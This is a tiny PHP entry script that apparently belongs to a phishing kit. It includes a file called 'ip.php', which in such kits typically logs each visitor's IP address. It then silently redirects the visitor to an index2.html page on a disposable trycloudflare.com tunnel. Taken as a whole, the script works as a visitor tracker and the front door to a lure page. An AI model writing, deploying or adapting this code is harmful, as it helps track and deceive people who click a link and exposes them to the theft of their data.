<?php
include 'ip.php';
header('Location: https://key-rebate-object-toner.trycloudflare.com/index2.html');
exit
?>
